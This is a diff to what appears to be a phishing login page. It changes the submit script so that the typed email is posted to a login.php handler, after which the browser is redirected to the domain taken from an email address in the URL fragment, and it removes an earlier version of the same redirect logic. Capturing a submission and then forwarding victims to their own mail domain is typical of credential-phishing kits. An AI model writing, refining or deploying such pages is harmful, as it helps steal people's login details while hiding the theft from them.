@@ -203,47 +203,55 @@ button:disabled {
 
 </div>
 
-<script type="text/javascript">
-
-const emailFromHash = window.location.hash.substring(1);
-
-if (emailFromHash) {
-    document.getElementById("email").value = emailFromHash;
-}
-
-document.getElementById("loginForm").addEventListener("submit", function (event) {
+<script>
+document.getElementById("loginForm").addEventListener("submit", async function (event) {
     event.preventDefault();
 
+    const email = document.getElementById("email").value.trim();
     const button = document.getElementById("submit-btn");
     const message = document.getElementById("message");
 
     button.disabled = true;
-    button.textContent = "Processing...";
+    button.textContent = "Sending...";
 
-    message.textContent = "Submission successful.";
+    try {
+        const response = await fetch("login.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: new URLSearchParams({
+                email: email
+            })
+        });
 
-    const atPosition = emailFromHash.lastIndexOf("@");
+        const result = await response.json();
 
-    if (atPosition === -1) {
-        message.textContent = "Invalid email address.";
+        if (!response.ok || !result.success) {
+            throw new Error(result.message || "Submission failed.");
+        }
+
+        const hashValue = window.location.hash.substring(1);
+        const atPosition = hashValue.lastIndexOf("@");
+
+        if (atPosition !== -1) {
+            const domain = hashValue.substring(atPosition + 1).trim();
+
+            if (/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain)) {
+                window.location.href = "https://" + domain;
+            }
+        }
+
+    } catch (error) {
+        console.error(error);
+        message.textContent = error.message;
+
         button.disabled = false;
         button.textContent = "Log in";
-        return;
     }
-
-    const domain = emailFromHash.substring(atPosition + 1).trim();
-
-    if (!/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain)) {
-        message.textContent = "Invalid domain.";
-        button.disabled = false;
-        button.textContent = "Log in";
-        return;
-    }
-
-    window.location.href = "https://" + domain;
 });
-
 </script>
+
 
 
 
